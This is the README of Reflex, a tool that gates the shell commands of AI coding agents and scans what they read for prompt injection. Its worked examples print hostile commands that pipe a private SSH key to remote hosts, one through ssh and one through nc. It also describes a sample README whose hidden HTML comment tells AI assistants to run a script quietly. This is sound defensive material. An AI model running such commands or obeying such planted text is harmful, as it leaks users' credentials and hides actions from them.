# ![Reflex, a pre-execution risk gate and prompt injection guard for AI coding agents](assets/wordmark.svg)

<p align="center">
  <a href="https://github.com/ursuciprian/reflex/actions/workflows/ci.yml"><img src="https://github.com/ursuciprian/reflex/actions/workflows/ci.yml/badge.svg" alt="CI status of the Reflex offline self-checks"></a>
  <a href="https://www.npmjs.com/package/@ursuciprian/reflex"><img src="https://img.shields.io/npm/v/@ursuciprian/reflex" alt="Latest version of @ursuciprian/reflex on npm"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
</p>

**Reflex makes AI coding agents prod-safe for infra teams: an open-source pre-execution hook for
Claude Code, Codex CLI, opencode and pi that judges every shell command by where it points and what
it will change, then lets it run, asks a human, or blocks it.**

Documentation website: <https://ursuciprian.github.io/reflex/>

![Claude Code with the Reflex plugin blocking a force push to main and a prompt injection](assets/demo.gif)

<p align="center"><sub>A real Claude Code session in a scratch repository; <a href="docs/demo/README.md">how to reproduce it</a>.</sub></p>

What it adds to the agents' built-in permission rules:

- **Plan-aware terraform gate.** `terraform apply` without a saved plan asks for
  `terraform plan -out=tfplan`. With `infra.terraform_show` on, Reflex reads the saved plan with
  `terraform show -json` and denies any delete or replace, naming stateful resources such as
  `aws_db_instance` first. It is off by default and needs a provider plugin cache, because
  `terraform show` starts the provider binaries in `.terraform`, which an agent could have written.
- **Environment awareness.** A command is judged with the AWS profile, kube context, Terraform
  workspace, git branch and production paths such as `envs/prod`: `kubectl delete namespace` asks in
  a dev context and is denied in a prod one.
- **One policy across agents.** A committed `.reflex/policy.json` gives every teammate the same
  extra rules, production markers, always-human patterns and freezes in Claude Code, Codex CLI,
  opencode, pi and Hermes. It can only tighten; its fast lane and webhook apply only after each
  teammate runs `reflex trust .`.
- **Change freeze.** A window such as Friday after 15:00 in `Europe/Bucharest`, or a date range,
  makes production commands that are not read-only ask or be denied, in shadow and enforce mode.
- **Audit export and webhook.** `reflex audit` writes one row per decision (agent, cwd, production
  tier, redacted command, decision, rule, who approved it) as csv, json or jsonl for SOC 2 and
  ISO 27001 change management evidence. A Slack or json webhook gets denies, asks or production
  decisions without delaying the hook.
- **Fail-closed hooks.** In enforce mode a hook that crashes while loading or deciding answers ask
  (Claude Code) or deny (Codex) instead of letting the command run unchecked.

It starts keyless, with local rules in shadow mode, and it also scans what the agent reads for
prompt injection. It gates shell commands, not file edits or MCP calls, and it does not replace a
sandbox or least-privilege credentials.

- [Install](#install)
- [In one minute](#in-one-minute)
- [Usage: Reflex commands](#usage-reflex-commands)
- [Features: infra guardrails, prompt injection guard, autonomous agents](#features-infra-guardrails-prompt-injection-guard-autonomous-agents)
- [Also included](#also-included)
- [How a command is decided](#how-a-command-is-decided)
- [Real-world scenarios, with outputs](#real-world-scenarios-with-outputs)
- [Measured results](#measured-results)
- [Replay: what it would have done on a real week](#replay-what-it-would-have-done-on-a-real-week)
- [Compared with other AI coding agent guardrails](#compared-with-other-ai-coding-agent-guardrails)
- [Supported agents: Claude Code hooks, Codex hooks and more](#supported-agents-claude-code-hooks-codex-hooks-and-more)
- [Cost and latency](#cost-and-latency)
- [Limits](#limits)
- [FAQ](#faq)
- [Documentation](#documentation)

## Install

### Claude Code plugin

Reflex is a Claude Code plugin with its own marketplace in this repository. Inside Claude Code:

```text
/plugin marketplace add ursuciprian/reflex
/plugin install reflex@reflex
```

Or from your shell: `claude plugin marketplace add ursuciprian/reflex`, then
`claude plugin install reflex@reflex`. Restart the session (or run `/reload-plugins`).

The plugin adds the same Claude Code hooks as `reflex setup` (the `PreToolUse` command gate on
`Bash|Task|Agent`, MCP tools and file writes, the post-tool and permission records, conditional instructions and the prompt
injection guard), plus read-only commands: `/reflex:status`, `/reflex:check <command>`,
`/reflex:report`, `/reflex:replay`, `/reflex:queue` and `/reflex:suggest`. `reflex` is on the Bash
`PATH` while the plugin is enabled. It needs Node.js 18+ as `node` on the `PATH` Claude Code runs
with; no build step, no npm install, no API key. Without saved settings it runs the local engine in
shadow mode, the same default as `reflex setup`, and it reads the same `~/.config/reflex/config.json`
and Keychain item when you have them.

The plugin changes no settings of its own. If `reflex setup` hooks are also in
`~/.claude/settings.json`, those run and the plugin's hooks exit at once, so no command is judged
twice; `reflex doctor` says which one is active. Two things only `reflex setup` does: it adds
permission rules that make Claude Code ask before editing Reflex's files and settings, and it sizes
the hook timeout to System 2 in the autonomous profile. See
[docs/SETUP.md: Claude Code plugin](docs/SETUP.md#claude-code-plugin).

### Codex CLI plugin

The same repository is a Codex CLI plugin marketplace. From your shell:

```sh
codex plugin marketplace add ursuciprian/reflex
codex plugin add reflex@reflex
```

Then open `codex`, run `/hooks` and trust the Reflex entries; Codex runs no plugin hook until you
do. The plugin adds the same Codex hooks as `reflex setup --agent codex`: the `PreToolUse` command
gate on `Bash` and `spawn_agent`, the post-tool records, conditional instructions on
`UserPromptSubmit` and the prompt injection guard on Bash and MCP results and on prompts. It needs
Node.js 18+ as `node` on the `PATH` Codex runs with, and no API key: without saved settings it runs
the local engine in shadow mode. If `reflex setup` hooks are also in `~/.codex/hooks.json`, those
run and the plugin's hooks exit at once, so no command is judged twice; `reflex doctor` says which
one is active. See [docs/SETUP.md: Codex CLI plugin](docs/SETUP.md#codex-cli-plugin).

### opencode plugin

The npm package is an opencode plugin. Add it to `~/.config/opencode/opencode.json`:

```json
{ "plugin": ["@ursuciprian/reflex"] }
```

opencode installs it at its next start. It registers the same hooks as the plugin file
`reflex setup --agent opencode` writes: the gate on `tool.execute.before` for `bash` and `task`,
instructions on `chat.message`, and the injection guard on tool results and prompts. It needs
Node.js 18+ as `node` on the `PATH` opencode runs with. If that setup file is also in
`~/.config/opencode/plugins/`, the npm plugin registers nothing, so no command is judged twice. See
[docs/SETUP.md: opencode plugin](docs/SETUP.md#opencode-plugin).

### Every agent: package runner or install script

```sh
npx @ursuciprian/reflex setup
pnpm dlx @ursuciprian/reflex setup
bunx @ursuciprian/reflex setup
yarn dlx @ursuciprian/reflex setup    # yarn 2+
```

Or with the install script:

```sh
curl -fsSL https://raw.githubusercontent.com/ursuciprian/reflex/main/install.sh | bash
```

Requirements: Node.js 18+ on macOS or Linux (including WSL). Native Windows is not supported yet.
No runtime dependencies; the optional LiteLLM routing hook needs Python 3.9+, and the optional Laya
engine Python 3.10+.

The installer copies the package to `~/.local/share/reflex`, links the `reflex` command into
`~/.local/bin`, and adds hooks to every supported agent it finds, in shadow mode, with the local
engine. Pass options after `bash -s --` or `setup`:

```sh
curl -fsSL https://raw.githubusercontent.com/ursuciprian/reflex/main/install.sh | bash -s -- --agents claude,codex
npx @ursuciprian/reflex setup --mode enforce
npx @ursuciprian/reflex setup --engine jev      # hosted classification with a TypeSafe API key
npx @ursuciprian/reflex setup --dry-run         # preview configuration changes
```

To use Jev, create a [TypeSafe API key](https://console.typesafe.ai/keys); macOS setup can store it
in the Keychain. See [docs/SETUP.md](docs/SETUP.md) for all options, per-agent notes and
uninstalling.

## In one minute

- **What it is:** a hook, installed with one command, that gates the shell tool of Claude Code,
  Codex CLI, pi, oh-my-pi, opencode and Hermes. MIT licensed, Node.js 18+, no runtime dependencies.
- **How it decides:** a read-only list, deterministic rules and a fast lane settle many commands
  on the machine with no API call (about half of one engineer's week of Claude Code commands, in
  the [replay](#replay-what-it-would-have-done-on-a-real-week) below). The rest go to the engine you
  chose: `local` asks a human, `jev` asks [TypeSafe Jev](https://docs.typesafe.ai) six typed
  questions and applies your `policy.json`.
- **What it blocks:** `rm -rf ~`, destructive operations on production, force pushes to `main`;
  it asks before `terraform apply` without a saved plan, before reads of SSH keys,
  `~/.aws/credentials` or `.env` files, and before commands judged risky in context.
- **Prompt injection:** tool results from the web, MCP servers, other projects and network
  commands are scanned; in enforce mode a finding warns the agent or removes the text, and makes
  the rest of the session stricter.
- **No key needed to start:** new installs use the local engine in shadow mode. A TypeSafe API key
  is optional.
- **Safe to try:** shadow mode only logs (hard rules still block), and `reflex replay` shows what
  it would have done with your past Claude Code, Codex, opencode and pi sessions without running
  anything.
- **Limits:** it gates shell commands, not file edits or MCP calls, and it does not replace a
  sandbox or least-privilege credentials.

Questions people ask about it are answered in the [Reflex FAQ](#faq) and in
[docs/FAQ.md](docs/FAQ.md).

## Usage: Reflex commands

```sh
reflex check "terraform apply -auto-approve" --cwd ~/infra/envs/prod   # judge one command
reflex scan page.html                                                  # check text for prompt injection
reflex report                                                          # decisions so far
reflex audit --since 30d --prod-only                                   # audit AI agent commands: one csv row per decision
reflex mcp                                                             # MCP server: advisory tools for Claude Desktop, Cursor and any MCP host
reflex replay claude --since 7d                                        # what it would have done with past sessions
reflex suggest claude --since 30d                                      # fewer permission prompts: safe fast-lane entries from past sessions
reflex learn                                                           # learn from approvals: what you approved 3+ times, never refused, could stop asking
reflex doctor                                                          # local checks; no API calls
reflex status                                                          # configured vs observed hooks
reflex run "command" --cwd /path/to/work                               # human terminal handoff
reflex setup --mode enforce                                            # start enforcing
reflex setup --profile autonomous                                      # System 2 and the approval queue
reflex queue                                                           # what waits for a human
reflex policy init                                                     # team policy: a starter .reflex/policy.json for this repo
reflex policy init --pack aws                                          # or a policy pack: aws, eks, terraform, startup-default
reflex trust .                                                         # let this repo's team fast lane apply (your terminal only)
reflex uninstall
```

A typical rollout: install in shadow mode, use your agents for a week, read `reflex report`, adjust
the user policy shown by `reflex status` if needed, then switch to enforce. Deterministic rules
enforce in shadow mode too; everything else is only logged. Settings and policy survive upgrades
and uninstall. `reflex run` always enforces, asks on its controlling terminal when needed, and
refuses deterministic denies; it does not grant an agent permission.

## Features: infra guardrails, prompt injection guard, autonomous agents

### Infra guardrails: terraform, kubectl, AWS and change management

Terraform AI agent guardrails and Claude Code production safety controls, which work the same way
in Codex CLI, opencode, pi and Hermes:

- [Plan-aware terraform gate](docs/GUIDE.md#plan-aware-terraform-gate-stop-ai-agents-from-destroying-infrastructure):
  an agent's `terraform apply` without a plan file asks for `terraform plan -out=tfplan`. With
  `infra.terraform_show` on and a provider plugin cache, Reflex judges the apply by what the saved
  plan will change: it reads the plan with `terraform show -json` (never `plan` or `apply`), denies a
  plan that deletes or replaces anything and names stateful resources such as `aws_db_instance`
  first. Off by default, because `terraform show` starts provider binaries an agent could have
  written; with the cache, it runs only when every provider in `.terraform` is a symlink into it.
  `terraform destroy` asks, and is denied in production.
- [OpenTofu AI agent guardrails and Terragrunt guardrails](docs/GUIDE.md#opentofu-and-terragrunt):
  `tofu apply <planfile>` goes through the same plan gate with `tofu show -json` and the same plugin
  cache check, and `tofu apply` without a plan asks for `tofu plan -out=tfplan`. `terragrunt apply`,
  `run-all apply` and `run --all apply` ask (terragrunt runs the hooks in `terragrunt.hcl`, so its
  plans are never read). `tofu destroy` and `terragrunt run-all destroy` ask, and are denied in
  production.
- [helm guardrails for AI agents](docs/GUIDE.md#helm-guardrails-for-ai-agents): a helm uninstall
  from an AI agent, `helm delete` or `helm rollback` asks, and is denied in a production kube
  context. `helm upgrade --install` in production asks with the release and namespace in the
  reason. Optional `infra.helm_diff` runs `helm diff upgrade` and flags removed PVCs, statefulsets
  and CRDs, only with a helm-diff plugin outside the working tree that has not changed since you
  saved `config.json`.
- kubectl AI agent guardrail (optional, `infra.kubectl_diff`): `kubectl diff` and server dry runs flag
  deletes of namespaces, PVCs, PVs, statefulsets and CRDs before they run.
- Production context: the working directory (`envs/prod`), AWS profile and region, kube context,
  Terraform workspace and git branch are part of every decision, so the same `kubectl delete` or
  `aws rds delete-db-instance` asks in dev and is denied in production.
- [Team policy](docs/GUIDE.md#team-policy-share-reflex-rules-across-a-repo): team guardrails for AI
  coding agents in a committed `.reflex/policy.json` (extra rules, always-human patterns, prod
  markers, freezes, a mode floor, stricter `infra` settings), applied by every teammate's Reflex in
  Claude Code, Codex and the other agents. It only tightens; its fast lane needs `reflex trust .`.
- [MCP server guardrails](docs/GUIDE.md#gate-mcp-tool-calls): AWS MCP safety and the same for
  Kubernetes, Terraform Cloud, database and GitHub MCP servers. Reflex blocks destructive MCP tool
  calls before they run: a tool named delete, destroy, drop, terminate, purge, rollback, uninstall
  and the like, a scale to zero, a bucket policy, security group or IAM change, destructive SQL or
  an HTTP DELETE asks, and is denied when an argument or the server points at production. A shell
  command in an argument (the AWS MCP server's `call_aws`) goes through the shell rules. Reads pass;
  an unknown tool is logged keyless and judged by Jev with a key. Claude Code, Codex, opencode, pi
  and Hermes.
- [Protected files](docs/GUIDE.md#protected-files): an Edit, Write, `apply_patch` or other file tool
  write to `.github/workflows/`, `.gitlab-ci.yml`, `envs/prod/`, production Terraform, tfvars and
  Dockerfiles, `.reflex/`, agent settings and hooks or shell startup files asks, and the reason names
  the path. Configurable; a team policy can add paths.
- [Change freeze](docs/GUIDE.md#change-freeze-for-ai-coding-agents): a deploy freeze or change
  window for AI coding agents (`{"days": ["fri"], "after": "15:00", "tz": "Europe/Bucharest"}` or a
  date range). During it, a production command that is not read-only asks or is denied, in shadow
  and enforce mode. Set in `config.json` or the team policy; it can only tighten, and
  `reflex status` shows whether a freeze is active.
- [Audit log](docs/GUIDE.md#audit-log-for-ai-agent-commands-soc-2): `reflex audit` exports one row
  per decision (agent, session, cwd, production tier and why, redacted command, decision, rule, who
  approved it) as csv, json or jsonl, for SOC 2 and ISO 27001 change management evidence. An
  optional [webhook](docs/GUIDE.md#decision-webhook) (Slack or json, https only) posts redacted
  denies, asks or production decisions without ever delaying the hook.
- [Fails closed](docs/GUIDE.md#reflex-fails-closed): every hook starts through `hook.mjs`, so a
  crash while loading or deciding still answers in the agent's own contract (Claude Code ask, Codex
  deny) in enforce mode, and `reflex status` reports it.

### Command gate: tool call gating before execution

- Blocks destructive commands such as `rm -rf ~`, deletes against production and force pushes to
  `main` with deterministic rules, in shadow and enforce modes.
- Judges the rest in context: working directory, AWS profile and region, kube context, Terraform
  workspace, git branch, and what the agent said it was doing.
- Reads the local script, make target or package script a command runs before it runs. Code it
  cannot read (`npx` packages, imported modules, `NODE_OPTIONS`, `curl | bash`) is marked unseen and
  never auto-approved.
- Asks before reading SSH private keys, `~/.aws/credentials`, `.netrc`, `.pgpass`, `.env` files or
  Kubernetes secrets.
- Only adds friction by default: it emits `ask` or `deny` and leaves `pass` to the agent's own
  permission settings. Opt-in [calibrated allow](docs/GUIDE.md#calibrated-allow) lets it approve
  commands it judges clearly safe.
- Redacts secrets before anything leaves the machine or is logged.

### Prompt injection guard for coding agents

- Scans tool results from the web, MCP servers, files outside the project and network commands for
  text written to steer the agent: hidden Unicode, instructions in HTML comments or hidden
  elements, text addressed to an AI, markdown image exfiltration, encoded payloads, letter-spaced
  phrases.
- Warns the agent, or removes the offending text where the agent lets a hook rewrite results.
- After a finding in enforce mode, the gate is stricter for the rest of that session: network
  egress asks, and nothing is auto-approved.
- In enforce mode, blocks prompts that contain a pasted credential.

### Autonomous coding agents with a human in the loop

- An escalation ladder: System 1 (rules and Jev) resolves most commands, uncertain ones go to a
  stronger model (System 2: the `claude` CLI, `codex exec`, the Anthropic API or any
  OpenAI-compatible endpoint), and the rest wait in an approval queue while the agent continues
  with other work.
- An always-human class that no model can approve: production changes, IAM and permission changes,
  writing secrets, destructive deletes, money and billing APIs, egress after a suspected prompt
  injection, and every deterministic rule outcome.
- Task envelopes (`reflex envelope set "..."`) that tell Jev and System 2 what the task may touch.
- Git checkpoints of tracked files before mutating commands, without touching the working tree or
  the index.
- Budgets, per-session caps, a verdict cache and a breaker that keep System 2 spend small.

### Engines: local rules and TypeSafe Jev (System One)

- `local` (default for new installs): rules, the read-only list and the fast lane. No key, no
  network calls. Uncovered commands ask.
- `jev`: TypeSafe's Jev model through the System One API answers six typed questions per uncovered
  command (eight with a task envelope); the policy file turns the answers into pass, ask or deny.
  Jev runs through TypeSafe directly or through a provider you may already pay for: Jev OpenRouter
  (Decisions API), Jev Cloudflare Workers AI, the Vercel AI Gateway, or any compatible endpoint.
  `reflex setup --provider openrouter`; each key goes to its own provider only
  ([GUIDE: use Jev through OpenRouter, Cloudflare or Vercel](docs/GUIDE.md#use-jev-through-openrouter-cloudflare-or-vercel)).
- `laya` (experimental, local): see [Also included](#also-included).

## Also included

General-purpose extras that ship in the same package. Most are optional, and several need Jev.

- [Runaway guard](docs/GUIDE.md#runaway-guard-stop-runaway-ai-agents): pauses a session on loops,
  a failing command run again and again, denial storms, burn rate and rising risk.
- [Replay](#replay-what-it-would-have-done-on-a-real-week): `reflex replay` runs your past Claude
  Code, Codex, opencode and pi commands through the gate, executing and writing nothing.
- [Suggest](docs/GUIDE.md#suggest-fewer-permission-prompts): `reflex suggest` proposes
  project-scoped fast-lane entries for the build, test and lint commands your agents keep asking
  about, and never suggests deletes, pushes, deploys, installs, network calls, secrets or production.
- [Learn](docs/GUIDE.md#reflex-learn-fewer-prompts-from-your-own-approvals): `reflex learn` reduces
  permission prompts in Claude Code and the other agents by learning from approvals: a shape you
  approved 3+ times in 2+ sessions and never refused becomes a project-scoped fast-lane entry, after
  you confirm it on the terminal, with its provenance recorded and a 60-day decay.
- [MCP server](docs/GUIDE.md#reflex-mcp-server-ask-before-acting-claude-desktop-cursor-cowork):
  `reflex mcp` gives Claude Desktop, Cursor, Cowork and any MCP host read-only, advisory tools
  (`reflex_check`, `reflex_scan`, `reflex_status`, `reflex_audit`, `reflex_explain`); hooks still
  enforce.
- [Model routing](docs/GUIDE.md#model-routing): a LiteLLM pre-call hook that keeps restricted
  content on cleared models and sends easy work to cheaper ones.
- [Context layer](docs/GUIDE.md#context-layer-pi-and-oh-my-pi) for pi and oh-my-pi (experimental):
  trims large tool outputs per request.
- [Tool router](docs/GUIDE.md#tool-router): one MCP server that exposes `find_tools`,
  `describe_tool` and `run` in front of your MCP servers, with every call gated.
- [Laya](docs/GUIDE.md#laya-local-system-1) (experimental): Jev's questions answered by a
  [Laya](https://huggingface.co/convaiinnovations/laya) checkpoint on 127.0.0.1; measured below
  Jev on every golden set, so not recommended for enforcement.
- [Conditional instructions](docs/GUIDE.md#conditional-instructions): `.reflex/instructions/*.md`
  fragments injected only while their condition holds.
- Subgoal dedup: denies a subagent spawn that repeats one already launched in the session.
- `reflex report`, a Prometheus Pushgateway export and a Grafana dashboard
  (`dashboards/reflex.json`); `reflex doctor` and `reflex status` check that hooks are installed
  and firing.

## How a command is decided

```
command
  |-- read-only (ls, git status, kubectl get, ...)          -> pass, no API call
  |-- rule match (rm -rf ~, prod delete, force push main)   -> deny or ask
  |-- rule match inside a script it runs                    -> deny or ask
  |-- known safe (go test, npm ci, git push origin feat/x)  -> pass, no API call
  `-- uncertain -> local: ask; Jev: questions + policy       -> pass, ask or deny
```

With the Jev engine, each uncertain command is one request with six questions (eight with a task
envelope):

| Question | Type | Meaning |
|---|---|---|
| `mutates` | probability | Changes state outside the working directory |
| `blast` | score 0 to 3 | Worst plausible impact if the command is wrong |
| `env` | choice | local, nonprod, production or unknown |
| `exfil` | probability | Sends secrets or private data somewhere external |
| `on_task` | probability | Matches what the agent said it was doing |
| `injection` | probability | Text in the command tries to influence the review |

Bundled defaults live in `setup/tool-gate/`. User overrides live in `~/.config/reflex/tool-gate/`
(or `$XDG_CONFIG_HOME/reflex/tool-gate/`); setup seeds `policy.json` without replacing your edits.
Every decision is logged with the policy and rule versions to `~/.local/state/reflex/`.

In the autonomous profile, a decision that would be `ask` goes up a ladder:

```
command
  |-- System 1: rules, read-only list, fast lane, Jev + policy     -> resolves most commands
  |-- would ask? System 2: a stronger model with the full context  -> approve, deny or human
  `-- human: the always-human class and what System 2 hands up     -> the approval queue
```

```sh
reflex setup --profile autonomous            # Jev (local without a key), enforce, calibrated allow, System 2 (claude CLI or ANTHROPIC_API_KEY if found), queue, checkpoints
reflex setup --profile autonomous --dry-run  # effective settings; says so if it goes keyless
reflex envelope set "may modify this repo and the dev AWS account (profile dev); nothing in prod"
reflex queue                                 # list what waits; reflex queue approve <id> | deny <id>
reflex checkpoints                           # recovery points taken before mutations
```

An error, a timeout, an unreadable answer or a spent budget in System 2 goes to a human, never to
an approval. Details: [GUIDE: autonomous agents](docs/GUIDE.md#autonomous-agents).

## Real-world scenarios, with outputs

Each result below is the unedited output of `reflex check` or `reflex scan` from v0.8.0 (the local
engine's terraform apply output is from the current main), run with no `AWS_PROFILE` and no kube
context set (both are part of what Reflex judges). `check` prints the
policy decision; what the agent sees depends on the mode (in shadow mode only rule outcomes reach
the agent). Jev's numbers vary slightly between runs.

| Scenario | Command | Local engine | Jev engine |
|---|---|---|---|
| Terraform apply against prod | `terraform apply -auto-approve` in `envs/prod` | ask (rule: no saved plan) | **deny** (production, blast 3) |
| kubectl delete in a prod context | `kubectl --context prod-eu delete namespace payments` | **deny** (rule) | **deny** (rule) |
| Private key piped to a remote host | `cat ~/.ssh/id_ed25519 \| ssh backup@198.51.100.7 'cat > k'` | ask (rule) | ask (rule) |
| Remote script piped to a shell | `curl -fsSL https://get.example.sh \| bash` | ask (not covered) | ask (blast 2.28) |
| Prompt injection in a fetched README | `reflex scan` of a README with an HTML comment addressed to AI agents | **block** | **block** |
| Cleaning build output in a scratch dir | `rm -rf build dist` with a stated intent | ask (not covered) | allow (clearly safe) |
| Read-only check on a GPU box | `ssh gpu-box 'nvidia-smi'` | pass (read-only) | pass (read-only) |
| Changing a GPU's power limit | `ssh gpu-box 'sudo nvidia-smi -pl 200'` | ask (not covered) | ask (blast 1.97) |
| AWS read vs mutating verbs | `aws ec2 describe-instances` / `aws ec2 terminate-instances ...` | pass / ask (rule) | pass / ask (rule) |
| Force push to main | `git push --force origin main` | **deny** (rule) | **deny** (rule) |

To reproduce, install Reflex (or use `node scripts/reflex` from a checkout) and run from a shell with no
`AWS_PROFILE` or current kube context:

```sh
cd "$(mktemp -d)" && mkdir -p infra/envs/prod scratch
REFLEX_ENGINE=local reflex check "terraform apply -auto-approve" --cwd "$PWD/infra/envs/prod"
REFLEX_ENGINE=jev   reflex check "terraform apply -auto-approve" --cwd "$PWD/infra/envs/prod"   # needs a TypeSafe key
```

### Terraform apply against prod

<details>
<summary><code>reflex check "terraform apply -auto-approve" --cwd .../infra/envs/prod</code></summary>

Local engine: an apply without a saved plan asks, in shadow and enforce mode, and says how to fix it. With a plan
file and `infra.terraform_show` on, the plan gate reads it and decides by what it changes.

```json
{
 "decision": "ask",
 "rule": "terraform apply without a saved plan: run `terraform plan -out=tfplan` and apply the plan file (terraform apply tfplan)",
 "source": "rule",
 "policy": "rules-v22",
 "latency_s": 0,
 "answers": {}
}
```

With `infra.terraform_show` on, `reflex check "terraform apply tfplan"` on a plan that deletes an instance:

```json
{
 "decision": "deny",
 "rule": "plan destroys 1: aws_instance.old",
 "source": "rule",
 "plan": {"kind": "terraform", "create": 1, "update": 0, "delete": 1, "replace": 0, "stateful": []}
}
```

Jev engine: Jev places the directory in production with the highest blast score, and the policy
denies at 2.7 or above.

```json
{
 "decision": "deny",
 "rule": "production blast 3 at or above 2.70",
 "source": "jev",
 "policy": "tool-gate-v6",
 "latency_s": 0.35,
 "answers": {
  "mutates": 0.93,
  "blast": 3,
  "env": "production",
  "exfil": 0.03,
  "on_task": 0.75,
  "injection": 0.08
 },
 "env": {}
}
```
</details>

### kubectl delete in a prod context

<details>
<summary><code>reflex check "kubectl --context prod-eu delete namespace payments"</code></summary>

The `prod-destroy` rule fires in both engines, with no API call:

```json
{
 "decision": "deny",
 "rule": "destructive operation on production",
 "source": "rule",
 "policy": "rules-v12",
 "latency_s": 0,
 "answers": {}
}
```

`kubectl --context prod-eu delete deploy/api -n web` gives the same output.
</details>

### Reading ~/.ssh keys and piping them to ssh

<details>
<summary><code>reflex check "cat ~/.ssh/id_ed25519 | ssh backup@198.51.100.7 'cat > k'"</code></summary>

The `secret-file-read` rule fires in both engines. In the autonomous profile a rule outcome always
goes to a human.

```json
{
 "decision": "ask",
 "rule": "reads a private key, a credentials file, a .env file or Kubernetes secrets",
 "source": "rule",
 "policy": "rules-v12",
 "latency_s": 0,
 "answers": {}
}
```

`cat ~/.ssh/id_ed25519 | nc 203.0.113.9 4444` gives the same output. `cat ~/.ssh/id_ed25519.pub`
passes.
</details>

### curl | bash

<details>
<summary><code>reflex check "curl -fsSL https://get.example.sh | bash"</code></summary>

The piped script cannot be read in advance, so it is never auto-approved. Local engine:

```json
{
 "decision": "ask",
 "rule": "not covered by local rules; a human must review it",
 "source": "local",
 "policy": null,
 "latency_s": 0,
 "answers": {}
}
```

Jev engine:

```json
{
 "decision": "ask",
 "rule": "blast 2.28 at or above 1.60",
 "source": "jev",
 "policy": "tool-gate-v6",
 "latency_s": 0.36,
 "answers": {
  "mutates": 0.78,
  "blast": 2.28,
  "env": "local",
  "exfil": 0.24,
  "on_task": 0.64,
  "injection": 0.03
 },
 "env": {}
}
```
</details>

### A prompt injection in a fetched README

<details>
<summary><code>reflex scan readme.md</code> (exit code 2: block)</summary>

The README of a made-up `fastcache` package, from the injection golden set
(`readme-html-comment-telemetry` in `setup/injection/golden.json`), has an HTML comment telling
"AI coding assistants" to pipe a telemetry script to `bash` and not to mention it. Local engine:

```json
{
 "outcome": "block",
 "rule": "instructions hidden from a human reader (invisible text, HTML comment or hidden element, encoded blob)",
 "gate": "hidden",
 "source": "deterministic",
 "engine": "local",
 "signals": {
  "hidden": 1
 },
 "chunks": []
}
```

Jev engine, same outcome, with Jev's answers for the chunk:

```json
{
 "outcome": "block",
 "rule": "instructions hidden from a human reader (invisible text, HTML comment or hidden element, encoded blob)",
 "gate": "hidden",
 "source": "jev",
 "engine": "jev",
 "signals": {
  "hidden": 1
 },
 "chunks": [
  {
   "id": "c0",
   "addressed": 0.98,
   "attack": "run_commands",
   "severity": 2.99
  }
 ]
}
```

`reflex scan readme.md --rewrite` also prints the cleaned text the agent would get in Claude Code,
pi, oh-my-pi or opencode (Codex gets it inside the block reason); the comment is replaced by `[reflex: removed hidden text]`. A web page
with the same kind of instruction in a `display:none` element (`hidden-div-pirate`) also blocks,
with Jev naming the attack `exfiltrate`.

For comparison, the rustup README, which tells a human to run `curl ... | sh`, passes in both
engines (exit code 0). With Jev:

```json
{
 "outcome": "pass",
 "rule": "phrase hits in text that informs rather than directs (addressed 0.03)",
 "gate": "jev-benign",
 "source": "jev",
 "engine": "jev",
 "signals": {
  "shell": 1,
  "acts": 1
 },
 "chunks": [
  {
   "id": "c0",
   "addressed": 0.03,
   "attack": "none",
   "severity": 0.73
  }
 ]
}
```

To reproduce, save the case texts to files:
`node -e 'const g=require("./setup/injection/golden.json");for(const c of g.cases)if(c.id==="readme-html-comment-telemetry")console.log(c.text)' > readme.md`
from a checkout, then `reflex scan readme.md`.
</details>

### rm -rf in a scratch directory (allowed)

<details>
<summary><code>reflex check "rm -rf build dist" --cwd .../scratch --intent "Cleaning the build output before a fresh build"</code></summary>

With Jev the command stays in the working directory and matches the stated intent, so it is
allow-eligible. `allow` skips Claude Code's own prompt only with `--allow on` in enforce mode
(supervised profile); elsewhere it is a silent pass. In the autonomous profile `rm -rf` is in the
always-human class and goes to a human. Without `--intent` the same command is `pass` with
`low risk (not allowed: no stated intent)`. The local engine asks.

```json
{
 "decision": "allow",
 "rule": "clearly safe: blast 1.16 at confidence 0.84",
 "source": "jev",
 "policy": "tool-gate-v6",
 "latency_s": 0.36,
 "answers": {
  "mutates": 0.02,
  "blast": 1.16,
  "env": "local",
  "exfil": 0,
  "on_task": 0.97,
  "injection": 0.04
 },
 "env": {}
}
```

`rm -rf ~` is denied by the `rm-root` rule in both engines (`recursive delete of / or home`).
</details>

### Read-only ssh and nvidia-smi on a GPU box

<details>
<summary><code>reflex check "ssh gpu-box 'nvidia-smi'"</code></summary>

A provably read-only remote command passes locally in both engines, with no API call. So does
`ssh gpu-box 'nvidia-smi --query-gpu=name,memory.used --format=csv'`.

```json
{
 "decision": "pass",
 "rule": "read-only",
 "source": "read-only",
 "policy": null,
 "latency_s": 0,
 "answers": {}
}
```

`ssh gpu-box 'sudo nvidia-smi -pl 200'` changes the power limit, so it is judged. Jev:

```json
{
 "decision": "ask",
 "rule": "blast 1.97 at or above 1.60",
 "source": "jev",
 "policy": "tool-gate-v6",
 "latency_s": 0.42,
 "answers": {
  "mutates": 0.94,
  "blast": 1.97,
  "env": "unknown",
  "exfil": 0.01,
  "on_task": 0.85,
  "injection": 0.02
 },
 "env": {}
}
```

The local engine asks (`not covered by local rules; a human must review it`). In enforce mode, in a
session that read a suspected prompt injection, even the read-only `ssh` asks, as egress.
</details>

### aws with mutating verbs

<details>
<summary><code>reflex check "aws ec2 terminate-instances --instance-ids i-0abc"</code></summary>

`aws ec2 describe-instances --region eu-west-1` is read-only and passes. Terminating instances hits
the `destroy` rule in both engines:

```json
{
 "decision": "ask",
 "rule": "destructive operation",
 "source": "rule",
 "policy": "rules-v12",
 "latency_s": 0,
 "answers": {}
}
```

`aws rds delete-db-instance --db-instance-identifier orders --skip-final-snapshot` gives the same
output. `aws s3 sync ./ s3://company-backups/ --delete` is not covered by a rule; the local engine
asks, and Jev asks with blast 2.57.
</details>

### git push --force to main

<details>
<summary><code>reflex check "git push --force origin main"</code></summary>

```json
{
 "decision": "deny",
 "rule": "force push or delete of main/master",
 "source": "rule",
 "policy": "rules-v12",
 "latency_s": 0,
 "answers": {}
}
```

`git push origin feat/login` passes through the fast lane (`"source": "fast-lane"`).
</details>

## Measured results

Every number below comes from a golden set in this repository; the Jev columns were run against
the live API with `jev-1.13.0`. The tool gate numbers were re-run on 2026-09-28 (171 cases, after v0.13.0); the injection and
ladder numbers are from v0.8.0; the Laya
and System 2 numbers are from the runs recorded in [docs/GUIDE.md](docs/GUIDE.md).

| Golden set | Jev engine | Local engine (keyless) | Method |
|---|---|---|---|
